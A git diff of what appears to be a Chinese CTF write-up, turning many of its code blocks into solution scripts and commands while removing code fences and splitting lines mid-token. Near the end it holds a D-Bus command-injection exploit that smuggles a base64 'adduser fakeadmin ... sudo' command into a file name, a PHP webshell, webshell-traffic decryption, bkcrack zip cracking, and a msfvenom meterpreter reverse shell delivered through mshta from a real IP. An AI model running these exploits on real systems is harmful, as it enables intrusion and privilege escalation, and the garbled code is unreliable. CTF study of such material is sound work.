@@ -248,14 +248,16 @@ for i in range(1,28):
                 data = re.findall(r'air123=(.*)', data)[0]
                 print(f'eval({i}).php - request:')
                 print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))
-            except:
+            
+except:
                 pass
         # else:
         #     try:
         #         data = data[16:-16]
         #         print(f'eval({i}).php - request:')
         #         print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))
-        #     except:
+        #     
+except:
         #         pass
 
 通过批量解密拿到密码 airDAS1231qaSW@，解压之前从流量包中提取出来的 flag.zip 拿到最终 flag。
@@ -314,11 +316,6 @@ with open('CharlieBrown-PC.elf', 'rb') as f:
    img_data[x, y] = tuple(data)
 
 img.save('screen.png')
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 # pip install pycryptodome
@@ -360,11 +357,6 @@ print('flag1t=', long_to_bytes(m1))
 print('flag2t=', long_to_bytes(m2))
 print('flag3t=', long_to_bytes(m3))
 print('flag4t=', long_to_bytes(m4))
-```
-
-
-
-```
 from PIL import Image
 
 img = Image.open('1.png')
@@ -382,18 +374,14 @@ for x in range(a):
             
 
 print(flag)
-```
-
-
-
-```
 from pathlib import Path
 
 import dbus
 import base64
 from pathlib import Path
 
-command = "adduser fakeadmin && adduser fakeadmin sudo && echo 'fakeadmin:Bb123***'|chpasswd"
+command = "adduser fakeadmin && adduser fakeadmin sudo && echo 'fakeadmin:
+Bb123***'|chpasswd"
 command_base64 = base64.b64encode(command.encode()).decode()
 path = '/tmp/`echo ' + command_base64 + '|base64 -d|sh`'
 Path(path).touch()
@@ -402,11 +390,6 @@ bus = dbus.SystemBus()
 remote_object = bus.get_object("cn.kylinos.KylinUpdateManager", "/cn/kylinos/KylinUpdateManager")
 remote_object.install_snap(path, dbus_interface="cn.kylinos.KylinUpdateManager")
 print("Command executed!")
-```
-
-
-
-```
 from PIL import Image
 import struct
 
@@ -422,50 +405,15 @@ for y in range(b):
 for i in range(0, len(flag), 8):
     fp.write(struct.pack('B', int(flag[i:i+8], 2)))
 fp.close()
-```
-
-
-
-```
 8750d5109208213f
-```
-
-
-
-```
 2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
-```
-
-
-
-```
 a=~[];a={___:++a,aaaa:(![]+"")[a],__a:++a,a_a_:(![]+"")[a],_a_:++a,a_aa:({}+"")[a],aa_a:(a[a]+"")[a],_aa:++a,aaa_:(!""+"")[a],a__:++a,a_a:++a,aa__:({}+"")[a],aa_:++a,aaa:++a,a___:++a,a__a:++a};a.a_=(a.a_=a+"")[a.a_a]+(a._a=a.a_[a.__a])+(a.aa=(a.a+"")[a.__a])+((!a)+"")[a._aa]+(a.__=a.a_[a.aa_])+(a.a=(!""+"")[a.__a])+(a._=(!""+"")[a._a_])+a.a_[a.a_a]+a.__+a._a+a.a;a.aa=a.a+(!""+"")[a._aa]+a.__+a._+a.a+a.aa;a.a=(a.___)[a.a_][a.a_];a.a(a.a(a.aa+"""+a.a_a_+(![]+"")[a._a_]+a.aaa_+"\"+a.__a+a.aa_+a._a_+a.__+"(\"\"+a.__a+a.___+a.a__+"\"+a.__a+a.___+a.__a+"\"+a.__a+a._a_+a._aa+"\"+a.__a+a.___+a._aa+"\"+a.__a+a._a_+a.a__+"\"+a.__a+a.___+a.aa_+"{"+a.aaaa+a.a___+a.___+a.a__a+a.aaa+a._a_+a.a_a+a.aaa+a.aa_a+a.aa_+a.a__a+a.a__a+a.aa_a+a.aaa+a.aaaa+a.aa_a+a.a_aa+a.a_a_+a.aaa+a.aaa_+a.a__a+a.aaa+a.a_a_+a.__a+a.a_a+a.aa__+a.a__+a.aaaa+a.a__a+a.a__+a.a_aa+a.a__+"}\"\"+a.a__+a.___+");"+""")())();
-```
-
-
-
-```
 md5sum zipeasy.zip
 echo -n "dasflow.pcapng" | hex
 time ./bkcrack -C zipeasy.zip -c dasflow.zip -x 30 646173666c6f772e706361706e67 -x 0 504B0304 > 1.log &
 tail -f 1.log
-```
-
-
-
-```
 2b7d78f3 0ebcabad a069728c
-```
-
-
-
-```
 ./bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip
-```
-
-
-
-```
 <?php
 @session_start();
 @set_time_limit(0);
@@ -497,11 +445,6 @@ if (isset($_POST[$pass])){
         }
     }
 }
-```
-
-
-
-```
 <?php
 function encode($D,$K){
     for($i=0;$i<strlen($D);$i++) {
@@ -517,11 +460,6 @@ $a = 'ca19adef3b7a8ce7J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOq
 $b = substr($a, 16, strlen($a)-32);
 echo gzdecode(encode(base64_decode($b), $key));
 // uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-
-
-```
 from urllib.parse import unquote
 import gzip, base64, re
 def encode(D, K):
@@ -542,57 +480,28 @@ for i in range(1,28):
                 data = re.findall(r'air123=(.*)', data)[0]
                 print(f'eval({i}).php - request:')
                 print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))
-            except:
+            
+except:
                 pass
         # else:
         #     try:
         #         data = data[16:-16]
         #         print(f'eval({i}).php - request:')
         #         print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))
-        #     except:
+        #     
+except:
         #         pass
-```
-
-
-
-```
-docker run -it -p 139:139 -p 445:445 -v /tmp:/share -d dperson/samba -s "public;/share"
-```
-
-
-
-```
-curl http://162.14.79.59:9988
-```
-
-
-
-```
+docker run -it -p 139:
+139 -p 445:
+445 -v /tmp:/share -d dperson/samba -s "public;/share"
+curl http://162.14.79.59:
+9988
 chmod 777 1.bat
-```
-
-
-
-```
 nc -lvnvp 9988
-```
-
-
-
-```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=162.14.121.186 LPORT=4444 -f hta-psh > shell.hta
-```
-
-
-
-```
 python3 -m http.server 9866
-```
-
-
-
-```
-mshta http://162.14.121.186:9866/shell.hta
+mshta http://162.14.121.186:
+9866/shell.hta
 ```
 
 
